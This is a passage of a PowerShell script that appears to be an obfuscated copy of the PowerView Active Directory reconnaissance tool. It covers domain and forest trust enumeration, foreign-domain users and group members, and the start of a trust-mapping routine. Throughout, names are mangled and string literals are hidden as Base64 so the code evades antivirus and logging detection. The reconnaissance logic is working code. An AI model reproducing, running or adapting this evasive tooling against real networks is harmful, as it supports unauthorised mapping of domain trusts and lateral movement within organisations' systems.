                if (${/==\_/=\____/===\}) {
                    try { ${/==\_/=\____/===\}.dispose() }
                    catch {
                        Write-Verbose $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFQAcgB1AHMAdABdACAARQByAHIAbwByACAAZABpAHMAcABvAHMAaQBuAGcAIABvAGYAIAB0AGgAZQAgAFIAZQBzAHUAbAB0AHMAIABvAGIAagBlAGMAdAA6ACAAJABfAA==')))
                    }
                }
                ${/==\/\/=====\____}.dispose()
            }
        }
        elseif ($PsCmdlet.ParameterSetName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) {
                ${_/\_/\/=\/\/===\/} = $Server
            }
            elseif ($Domain -and $Domain.Trim() -ne '') {
                ${_/\_/\/=\/\/===\/} = $Domain
            }
            else {
                ${_/\_/\/=\/\/===\/} = $Null
            }
            ${/==\_/\_/\/==\___} = [IntPtr]::Zero
            ${______/\/\/\/==\/} = 63
            ${____/=\/===\_/===} = 0
            ${/\_____/=\__/==\_} = ${_/=\/\/===\/\___/}::DsEnumerateDomainTrusts(${_/\_/\/=\/\/===\/}, ${______/\/\/\/==\/}, [ref]${/==\_/\_/\/==\___}, [ref]${____/=\/===\_/===})
            ${__/===\/=\/\__/\/=} = ${/==\_/\_/\/==\___}.ToInt64()
            if ((${/\_____/=\__/==\_} -eq 0) -and (${__/===\/=\/\__/\/=} -gt 0)) {
                ${________/=\/\__/\} = ${/=\__/\/\/\_/\_/\}::GetSize()
                for (${/==\__/===\__/\__} = 0; (${/==\__/===\__/\__} -lt ${____/=\/===\_/===}); ${/==\__/===\__/\__}++) {
                    ${/=\_/\/=\/\__/\/=} = New-Object System.Intptr -ArgumentList ${__/===\/=\/\__/\/=}
                    ${/=\__/\__/==\/===} = ${/=\_/\/=\/\__/\/=} -as ${/=\__/\/\/\_/\_/\}
                    ${__/===\/=\/\__/\/=} = ${/=\_/\/=\/\__/\/=}.ToInt64()
                    ${__/===\/=\/\__/\/=} += ${________/=\/\__/\}
                    ${_________/\/\____} = ''
                    ${/\_____/=\__/==\_} = ${/\____/=\/\/=\/\_}::ConvertSidToStringSid(${/=\__/\__/==\/===}.DomainSid, [ref]${_________/\/\____});${___/\____/\_/====} = [Runtime.InteropServices.Marshal]::GetLastWin32Error()
                    if (${/\_____/=\__/==\_} -eq 0) {
                        Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] ${___/\____/\_/====}).Message)"
                    }
                    else {
                        ${_/\/\/======\___/} = New-Object PSObject
                        ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBvAHUAcgBjAGUATgBhAG0AZQA='))) ${_/==\_/=\/====\_/}
                        ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBhAG0AZQA='))) ${/=\__/\__/==\/===}.DnsDomainName
                        ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQATgBlAHQAYgBpAG8AcwBOAGEAbQBlAA=='))) ${/=\__/\__/==\/===}.NetbiosDomainName
                        ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBsAGEAZwBzAA=='))) ${/=\__/\__/==\/===}.Flags
                        ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABhAHIAZQBuAHQASQBuAGQAZQB4AA=='))) ${/=\__/\__/==\/===}.ParentIndex
                        ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AFQAeQBwAGUA'))) ${/=\__/\__/==\/===}.TrustType
                        ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AEEAdAB0AHIAaQBiAHUAdABlAHMA'))) ${/=\__/\__/==\/===}.TrustAttributes
                        ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQAUwBpAGQA'))) ${_________/\/\____}
                        ${_/\/\/======\___/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABhAHIAZwBlAHQARwB1AGkAZAA='))) ${/=\__/\__/==\/===}.DomainGuid
                        ${_/\/\/======\___/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBBAFAASQA='))))
                        ${_/\/\/======\___/}
                    }
                }
                $Null = ${_/=\/\/===\/\___/}::NetApiBufferFree(${/==\_/\_/\/==\___})
            }
            else {
                Write-Verbose "[Get-DomainTrust] Error: $(([ComponentModel.Win32Exception] ${/\_____/=\__/==\_}).Message)"
            }
        }
        else {
            ${/====\___/\/\/===} = ____/\/\/=\/\/==\/ @/=\__/\/\_/=====\
            if (${/====\___/\/\/===}) {
                ${/====\___/\/\/===}.GetAllTrustRelationships() | % {
                    $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBEAG8AbQBhAGkAbgBUAHIAdQBzAHQALgBOAEUAVAA='))))
                    $_
                }
            }
        }
    }
}
function __/=\/==\/=\__/==\ {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForestTrust.NET')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Forest,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    PROCESS {
        ${/==\/==\/\____/\/} = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))]) { ${/==\/==\/\____/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $Forest }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/==\/==\/\____/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        ${/==\__/=\_/\__/\_} = _/=\/\/\____/==\/= @/==\/==\/\____/\/
        if (${/==\__/=\_/\__/\_}) {
            ${/==\__/=\_/\__/\_}.GetAllTrustRelationships() | % {
                $_.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAHMAdABUAHIAdQBzAHQALgBOAEUAVAA='))))
                $_
            }
        }
    }
}
function Get-DomainForeignUser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{}
        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAGUAbQBiAGUAcgBvAGYAPQAqACkA')))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $Raw }
    }
    PROCESS {
        __/\__/\/======\_/ @/=\___/=\__/=\/\/  | % {
            ForEach (${/\______/==\___/=} in $_.memberof) {
                ${/==\/\/\/=\/\/\/\} = ${/\______/==\___/=}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                if (${/==\/\/\/=\/\/\/\}) {
                    ${____/\/=\/\/=\___} = $(${/\______/==\___/=}.SubString(${/==\/\/\/=\/\/\/\})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    ${_/==\/\/==\_/\__/} = $_.distinguishedname
                    ${_/==\/==\/\___/\/} = ${_/==\/\/==\_/\__/}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))
                    $UserDomain = $($_.distinguishedname.SubString(${_/==\/==\/\___/\/})) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                    if (${____/\/=\/\/=\___} -ne $UserDomain) {
                        ${___/===\/=\___/\/} = ${/\______/==\___/=}.Split(',')[0].split('=')[1]
                        ${/===\/===\/\/=\_/} = New-Object PSObject
                        ${/===\/===\/\/=\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAG8AbQBhAGkAbgA='))) $UserDomain
                        ${/===\/===\/\/=\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBOAGEAbQBlAA=='))) $_.samaccountname
                        ${/===\/===\/\/=\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBEAGkAcwB0AGkAbgBnAHUAaQBzAGgAZQBkAE4AYQBtAGUA'))) $_.distinguishedname
                        ${/===\/===\/\/=\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${____/\/=\/\/=\___}
                        ${/===\/===\/\/=\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${___/===\/=\___/\/}
                        ${/===\/===\/\/=\_/} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) ${/\______/==\___/=}
                        ${/===\/===\/\/=\_/}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAGkAZwBuAFUAcwBlAHIA'))))
                        ${/===\/===\/\/=\_/}
                    }
                }
            }
        }
    }
}
function Get-DomainForeignGroupMember {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ForeignGroupMember')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    BEGIN {
        ${/=\___/=\__/=\/\/} = @{}
        ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAGUAbQBiAGUAcgA9ACoAKQA=')))
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))]) { ${/=\___/=\__/=\/\/}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBhAHcA')))] = $Raw }
    }
    PROCESS {
        ${_/\/\_/\/\__/\/==} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgBzAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4AIABVAHMAZQByAHMA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwB1AGUAcwB0AHMA'))))
        ___/\/=========\/\ @/=\___/=\__/=\/\/ | ? { ${_/\/\_/\/\__/\/==} -notcontains $_.samaccountname } | % {
            ${___/===\/=\___/\/} = $_.samAccountName
            ${_/\/\____/=\_/\_/} = $_.distinguishedname
            ${____/\/=\/\/=\___} = ${_/\/\____/=\_/\_/}.SubString(${_/\/\____/=\_/\_/}.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
            $_.member | % {
                ${_/===\/===\___/\_} = $_.SubString($_.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                if (($_ -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBOAD0AUwAtADEALQA1AC0AMgAxAC4AKgAtAC4AKgA=')))) -or (${____/\/=\/\/=\___} -ne ${_/===\/===\___/\_})) {
                    ${_/\_/=\/===\_/\/=} = $_
                    ${___/=\/==\/=\/===} = $_.Split(',')[0].split('=')[1]
                    ${____/=\_/\/\___/\} = New-Object PSObject
                    ${____/=\_/\/\___/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAbwBtAGEAaQBuAA=='))) ${____/\/=\/\/=\___}
                    ${____/=\_/\/\___/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAE4AYQBtAGUA'))) ${___/===\/=\___/\/}
                    ${____/=\_/\/\___/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAEQAaQBzAHQAaQBuAGcAdQBpAHMAaABlAGQATgBhAG0AZQA='))) ${_/\/\____/=\_/\_/}
                    ${____/=\_/\/\___/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABvAG0AYQBpAG4A'))) ${_/===\/===\___/\_}
                    ${____/=\_/\/\___/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIATgBhAG0AZQA='))) ${___/=\/==\/=\/===}
                    ${____/=\_/\/\___/\} | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBlAG0AYgBlAHIARABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABOAGEAbQBlAA=='))) ${_/\_/=\/===\_/\/=}
                    ${____/=\_/\/\___/\}.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBGAG8AcgBlAGkAZwBuAEcAcgBvAHUAcABNAGUAbQBiAGUAcgA='))))
                    ${____/=\_/\/\___/\}
                }
            }
        }
    }
}
function Get-DomainTrustMapping {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.DomainTrust.NET')]
    [OutputType('PowerView.DomainTrust.LDAP')]
    [OutputType('PowerView.DomainTrust.API')]
    [CmdletBinding(DefaultParameterSetName = 'LDAP')]
    Param(
        [Parameter(ParameterSetName = 'API')]
        [Switch]
        $API,
        [Parameter(ParameterSetName = 'NET')]
        [Switch]
        $NET,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [Parameter(ParameterSetName = 'LDAP')]
        [Parameter(ParameterSetName = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [Parameter(ParameterSetName = 'LDAP')]
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [Parameter(ParameterSetName = 'LDAP')]
        [Switch]
        $Tombstone,
        [Parameter(ParameterSetName = 'LDAP')]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )
    ${___/=\/\/=\/\_/\/} = @{}
    ${___/==\___/\__/\/} = New-Object System.Collections.Stack
    ${_/\/=====\/==\/==} = @{}
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))]) { ${_/\/=====\/==\/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBQAEkA')))] = $API }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))]) { ${_/\/=====\/==\/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBFAFQA')))] = $NET }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { ${_/\/=====\/==\/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { ${_/\/=====\/==\/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { ${_/\/=====\/==\/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { ${_/\/=====\/==\/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { ${_/\/=====\/==\/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { ${_/\/=====\/==\/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { ${_/\/=====\/==\/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { ${_/\/=====\/==\/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { ${_/\/=====\/==\/==}[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
    if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
        ${/==\_/=\__/==\_/\} = (____/\/\/=\/\/==\/ -Credential $Credential).Name
    }
    else {
        ${/==\_/=\__/==\_/\} = (____/\/\/=\/\/==\/).Name
    }
    ${___/==\___/\__/\/}.Push(${/==\_/=\__/==\_/\})
    while(${___/==\___/\__/\/}.Count -ne 0) {
        $Domain = ${___/==\___/\__/\/}.Pop()
